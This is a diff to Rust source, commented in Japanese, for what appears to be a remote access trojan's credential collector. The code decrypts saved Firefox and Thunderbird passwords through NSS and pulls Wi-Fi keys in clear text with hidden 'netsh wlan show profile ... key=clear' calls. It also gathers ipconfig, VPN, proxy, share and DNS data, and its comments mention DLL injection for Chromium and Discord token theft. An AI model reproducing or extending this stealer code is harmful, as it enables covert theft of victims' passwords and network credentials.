+fn collect_structured_browser_passwords() -> Vec<BrowserCredential> {
+    let mut credentials = Vec::new();
     
     // Firefox/Thunderbird 専用スキャン（NSS復号化）
-    if let Ok(mut firefox_passwords) = collect_firefox_passwords() {
-        println!("🦊 Firefox scan found {} entries", firefox_passwords.len());
-        passwords.append(&mut firefox_passwords);
+    #[cfg(feature = "browser")]
+    {
+        if let Ok(firefox_creds) = collect_firefox_structured_passwords() {
+            credentials.extend(firefox_creds);
+        }
     }
     
-    // Chromium系はDLL注入で処理するため、ここではスキップ
+    // Chromium系はDLL注入で処理されるため、ここではスキップ
     
-    if passwords.is_empty() {
-        vec!["No browser passwords found".to_string()]
-    } else {
-        println!("✅ Total browser passwords collected: {}", passwords.len());
-        passwords
-    }
+    credentials
 }
 
-#[cfg(not(feature = "browser"))]
-fn collect_browser_passwords() -> Vec<String> {
-    vec!["Browser feature not enabled".to_string()]
-}
-
-// Firefox/Thunderbird パスワード収集
 #[cfg(feature = "browser")]
-fn collect_firefox_passwords() -> RatResult<Vec<String>> {
+fn collect_firefox_structured_passwords() -> Result<Vec<BrowserCredential>, CollectError> {
     use crate::collectors::password_manager::NssCredentials;
     
-    let mut passwords = Vec::new();
-    let profiles = get_firefox_profiles()?;
+    let mut credentials = Vec::new();
+    let profiles = get_firefox_profiles().map_err(|e| CollectError::Parse(format!("Firefox profiles: {}", e)))?;
     
     for profile_path in profiles {
         let browser_name = detect_firefox_browser_type(&profile_path);
@@ -86,18 +1013,289 @@ fn collect_firefox_passwords() -> RatResult<Vec<String>> {
         match nss.get_decrypted_logins() {
             Ok(creds) => {
                 for cred in creds {
-                    passwords.push(format!(
-                        "{} - {}: {} / {}",
-                        browser_name, cred.hostname, cred.username, cred.password
-                    ));
+                    credentials.push(BrowserCredential {
+                        browser: browser_name.to_string(),
+                        hostname: cred.hostname,
+                        username: cred.username,
+                        password: cred.password,
+                    });
                 }
             }
             Err(_) => continue,
         }
     }
     
-    Ok(passwords)
+    Ok(credentials)
 }
+
+// -------------------------------------------------------------------------------------------------
+// 構造化されたネットワーク情報収集
+// -------------------------------------------------------------------------------------------------
+
+fn collect_enhanced_network_data() -> (Vec<String>, Vec<WifiProfile>, Vec<AuthNetworkInterface>) {
+    #[cfg(windows)]
+    {
+        let (legacy, wifi_profiles, network_interfaces) = collect_windows_network_data();
+        (legacy, wifi_profiles, network_interfaces)
+    }
+    #[cfg(not(windows))]
+    {
+        let legacy = collect_unix_network_info();
+        (legacy, Vec::new(), Vec::new())
+    }
+}
+
+#[cfg(windows)]
+fn collect_windows_network_data() -> (Vec<String>, Vec<WifiProfile>, Vec<AuthNetworkInterface>) {
+    let mut legacy_data = Vec::new();
+    let mut wifi_profiles = Vec::new();
+    let mut network_interfaces = Vec::new();
+    
+    // WiFiプロファイル情報収集
+    if let Ok((legacy_wifi, structured_wifi)) = collect_structured_wifi_profiles() {
+        legacy_data.extend(legacy_wifi);
+        wifi_profiles.extend(structured_wifi);
+    }
+    
+    // ネットワークインターフェース情報収集
+    if let Ok(interfaces) = collect_structured_network_interfaces() {
+        network_interfaces.extend(interfaces);
+    }
+    
+    // 追加のネットワーク情報（VPN、イーサネット、等）
+    legacy_data.extend(collect_vpn_connections());
+    legacy_data.extend(collect_ethernet_info());
+    legacy_data.extend(collect_bluetooth_devices());
+    legacy_data.extend(collect_network_adapters());
+    legacy_data.extend(collect_proxy_settings());
+    legacy_data.extend(collect_network_shares());
+    legacy_data.extend(collect_dns_cache());
+    
+    (legacy_data, wifi_profiles, network_interfaces)
+}
+
+#[cfg(windows)]
+fn collect_structured_wifi_profiles() -> Result<(Vec<String>, Vec<WifiProfile>), CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut legacy_data = Vec::new();
+    let mut wifi_profiles = Vec::new();
+    legacy_data.push("=== WiFi プロファイル情報 ===".to_string());
+    
+    // プロファイル一覧取得
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && netsh wlan show profiles"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if !output.status.success() {
+        return Err(CollectError::CommandFailed("netsh wlan show profiles failed".to_string()));
+    }
+    
+    let profiles_text = decode_windows_output_enhanced(&output.stdout);
+    let profile_names = parse_wifi_profile_names(&profiles_text);
+    
+    legacy_data.push(format!("発見されたWiFiプロファイル数: {}", profile_names.len()));
+    
+    // 各プロファイルの詳細情報取得
+    for profile_name in profile_names {
+        if let Ok(profile_detail) = get_wifi_profile_detail(&profile_name) {
+            legacy_data.extend(profile_detail.legacy_info);
+            if let Some(structured) = profile_detail.structured_profile {
+                wifi_profiles.push(structured);
+            }
+        }
+    }
+    
+    Ok((legacy_data, wifi_profiles))
+}
+
+#[cfg(windows)]
+fn collect_structured_network_interfaces() -> Result<Vec<AuthNetworkInterface>, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let output = Command::new("cmd")
+        .args(["/C", "chcp 65001 >nul 2>&1 && ipconfig /all"])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if !output.status.success() {
+        return Err(CollectError::CommandFailed("ipconfig /all failed".to_string()));
+    }
+    
+    let ipconfig_text = decode_windows_output_enhanced(&output.stdout);
+    let interfaces = parse_ipconfig_interfaces(&ipconfig_text);
+    
+    Ok(interfaces)
+}
+
+struct WifiProfileDetail {
+    legacy_info: Vec<String>,
+    structured_profile: Option<WifiProfile>,
+}
+
+#[cfg(windows)]
+fn get_wifi_profile_detail(profile_name: &str) -> Result<WifiProfileDetail, CollectError> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut legacy_info = Vec::new();
+    let mut structured_profile = None;
+    
+    // プロファイル詳細取得
+    let detail_output = Command::new("cmd")
+        .args(["/C", &format!("chcp 65001 >nul 2>&1 && netsh wlan show profile name=\"{}\" key=clear", profile_name)])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| CollectError::Io(e))?;
+    
+    if detail_output.status.success() {
+        let detail_text = decode_windows_output_enhanced(&detail_output.stdout);
+        legacy_info.extend(detail_text.lines().map(|s| s.to_string()).take(20));
+        
+        // 構造化データの抽出
+        let mut wifi_profile = WifiProfile {
+            ssid: profile_name.to_string(),
+            key: None,
+            interface: None,
+            auth_type: None,
+        };
+        
+        // キーマテリアルの抽出
+        for line in detail_text.lines() {
+            if contains_any(line, ["Key Content", "キー コンテンツ"]) && line.contains(':') {
+                if let Some(key) = line.split(':').nth(1) {
+                    let key_value = trim_all(key);
+                    if !key_value.is_empty() && key_value != "Not Present" && !key_value.contains("存在しません") {
+                        wifi_profile.key = Some(key_value);
+                    }
+                }
+            }
+            if contains_any(line, ["Authentication", "認証"]) && line.contains(':') {
+                if let Some(auth) = line.split(':').nth(1) {
+                    wifi_profile.auth_type = Some(trim_all(auth));
+                }
+            }
+        }
+        
+        structured_profile = Some(wifi_profile);
+    }
+    
+    Ok(WifiProfileDetail {
+        legacy_info,
+        structured_profile,
+    })
+}
+
+#[cfg(windows)]
+fn parse_wifi_profile_names(text: &str) -> Vec<String> {
+    let mut profiles = Vec::new();
+    
+    for line in text.lines() {
+        if contains_any(line, ["All User Profile", "すべてのユーザー プロファイル"]) && line.contains(':') {
+            if let Some(profile_name) = line.split(':').nth(1) {
+                let name = trim_all(profile_name);
+                if !name.is_empty() {
+                    profiles.push(name);
+                }
+            }
+        }
+    }
+    
+    profiles
+}
+
+#[cfg(windows)]
+fn parse_ipconfig_interfaces(text: &str) -> Vec<AuthNetworkInterface> {
+    let mut interfaces = Vec::new();
+    let mut current_interface: Option<AuthNetworkInterface> = None;
+    
+    for line in text.lines() {
+        let line = line.trim_end();
+        if line.is_empty() { continue; }
+        
+        // アダプター名の検出
+        if line.ends_with(':') && contains_any(line, ["adapter", "アダプター", "Ethernet", "Wi-Fi", "ワイヤレス"]) {
+            if let Some(interface) = current_interface.take() {
+                interfaces.push(interface);
+            }
+            
+            current_interface = Some(AuthNetworkInterface {
+                name: line.trim_end_matches(':').to_string(),
+                mac: None,
+                ipv4: Vec::new(),
+                ipv6: Vec::new(),
+                gateway: Vec::new(),
+                dns: Vec::new(),
+            });
+            continue;
+        }
+        
+        if let Some(ref mut interface) = current_interface {
+            let line_trimmed = line.trim();
+            
+            // MAC アドレス
+            if contains_any(line_trimmed, ["Physical Address", "物理アドレス"]) && line_trimmed.contains(':') {
+                if let Some(mac) = line_trimmed.split(':').nth(1) {
+                    interface.mac = Some(trim_all(mac));
+                }
+            }
+            
+            // IPv4 アドレス
+            if contains_any(line_trimmed, ["IPv4 Address", "IPv4 アドレス"]) && line_trimmed.contains(':') {
+                if let Some(ip) = line_trimmed.split(':').nth(1) {
+                    let ip_clean = trim_all(ip).trim_end_matches("(Preferred)").trim().to_string();
+                    if !ip_clean.is_empty() {
+                        interface.ipv4.push(ip_clean);
+                    }
+                }
+            }
+            
+            // IPv6 アドレス
+            if contains_any(line_trimmed, ["IPv6 Address", "IPv6 アドレス"]) && line_trimmed.contains(':') {
+                if let Some(ip) = line_trimmed.split(':').nth(1) {
+                    let ip_clean = trim_all(ip).trim_end_matches("(Preferred)").trim().to_string();
+                    if !ip_clean.is_empty() {
+                        interface.ipv6.push(ip_clean);
+                    }
+                }
+            }
+            
+            // デフォルトゲートウェイ
+            if contains_any(line_trimmed, ["Default Gateway", "既定のゲートウェイ"]) && line_trimmed.contains(':') {
+                if let Some(gw) = line_trimmed.split(':').nth(1) {
+                    let gw_clean = trim_all(gw);
+                    if !gw_clean.is_empty() {
+                        interface.gateway.push(gw_clean);
+                    }
+                }
+            }
+            
+            // DNS サーバー
+            if starts_with_any(line_trimmed, ["DNS Servers", "DNS サーバー"]) && line_trimmed.contains(':') {
+                if let Some(dns) = line_trimmed.split(':').nth(1) {
+                    let dns_clean = trim_all(dns);
+                    if !dns_clean.is_empty() {
+                        interface.dns.push(dns_clean);
+                    }
+                }
+            }
+        }
+    }
+    
+    // 最後のインターフェースを追加
+    if let Some(interface) = current_interface {
+        interfaces.push(interface);
+    }
+    
+    interfaces
+}
+
+// 未使用関数を削除済み - collect_browser_passwords() は auth_collector::collect_auth_data() で直接実装
 
 // Chromiumパスワード収集はDLL注入で実装されています
 
@@ -113,111 +1311,12 @@ fn collect_discord_tokens() -> RatResult<Vec<String>> {
     }
 }
 
-// 強化されたネットワーク認証情報収集システム
-fn collect_wifi_credentials() -> Vec<String> {
-    #[cfg(windows)]
-    {
-        let mut network_creds = Vec::new();
-        
-        // 1. WiFiプロファイル認証情報
-        network_creds.extend(collect_wifi_profiles());
-        
-        // 2. VPN接続情報
-        network_creds.extend(collect_vpn_connections());
-        
-        // 3. イーサネット接続情報
-        network_creds.extend(collect_ethernet_info());
-        
-        // 4. Bluetooth接続デバイス
-        network_creds.extend(collect_bluetooth_devices());
-        
-        // 5. ネットワークアダプター情報
-        network_creds.extend(collect_network_adapters());
-        
-        // 6. プロキシ設定
-        network_creds.extend(collect_proxy_settings());
-        
-        // 7. ネットワーク共有情報
-        network_creds.extend(collect_network_shares());
-        
-        // 8. DNSキャッシュ情報
-        network_creds.extend(collect_dns_cache());
-        
-        network_creds
-    }
-    #[cfg(not(windows))]
-    {
-        collect_unix_network_info()
-    }
-}
+// 古い関数は削除済み - decode_windows_output_enhanced を使用
 
-/// WiFiプロファイルとパスワード収集（強化版）
-#[cfg(windows)]
-fn collect_wifi_profiles() -> Vec<String> {
-    use std::process::Command;
-    use std::os::windows::process::CommandExt;
-    
-    let mut wifi_data = Vec::new();
-    wifi_data.push("=== WiFi プロファイル情報 ===".to_string());
-    
-    // プロファイル一覧取得
-    if let Ok(output) = Command::new("netsh")
-        .args(["wlan", "show", "profiles"])
-        .creation_flags(0x08000000)
-        .output()
-    {
-        let profiles_text = String::from_utf8_lossy(&output.stdout);
-        let profile_names: Vec<String> = profiles_text
-            .lines()
-            .filter(|line| line.contains("All User Profile"))
-            .filter_map(|line| line.split(':').nth(1))
-            .map(|name| name.trim().to_owned())
-            .filter(|name| !name.is_empty())
-            .collect();
-            
-        wifi_data.push(format!("発見されたWiFiプロファイル数: {}", profile_names.len()));
-        
-        // 各プロファイルの詳細情報とパスワード取得
-        for profile_name in profile_names {
-            wifi_data.push(format!("\n--- プロファイル: {} ---", profile_name));
-            
-            // 詳細情報取得
-            if let Ok(detail_output) = Command::new("netsh")
-                .args(["wlan", "show", "profile", &profile_name, "key=clear"])
-                .creation_flags(0x08000000)
-                .output()
-            {
-                let detail_text = String::from_utf8_lossy(&detail_output.stdout);
-                
-                // SSID、セキュリティ、パスワードを抽出
-                for line in detail_text.lines() {
-                    if line.contains("SSID name") || 
-                       line.contains("Authentication") || 
-                       line.contains("Cipher") ||
-                       line.contains("Security key") ||
-                       line.contains("Key Content") ||
-                       line.contains("Connection mode") ||
-                       line.contains("Network type") {
-                        wifi_data.push(format!("  {}", line.trim()));
-                    }
-                }
-            }
-        }
-    }
-    
-    // 現在の接続状態
-    if let Ok(output) = Command::new("netsh")
-        .args(["wlan", "show", "interfaces"])
-        .creation_flags(0x08000000)
-        .output()
-    {
-        wifi_data.push("\n=== 現在のWiFi接続状態 ===".to_string());
-        let interfaces_text = String::from_utf8_lossy(&output.stdout);
-        wifi_data.extend(interfaces_text.lines().map(|s| s.to_string()));
-    }
-    
-    wifi_data
-}
+// 未使用関数を削除済み - collect_wifi_credentials(), collect_wifi_profiles() 
+// ネットワーク情報は collect_detailed_system_info() で収集済み
+
+// WiFiプロファイル収集は collect_detailed_system_info() 内で実装済み
 
 /// VPN接続情報収集
 #[cfg(windows)]
@@ -233,7 +1332,7 @@ fn collect_vpn_connections() -> Vec<String> {
         .creation_flags(0x08000000)
         .output()
     {
-        let ras_text = String::from_utf8_lossy(&output.stdout);
+        let ras_text = decode_windows_output_enhanced(&output.stdout);
         vpn_data.extend(ras_text.lines().map(|s| format!("RAS: {}", s)));
     }
     
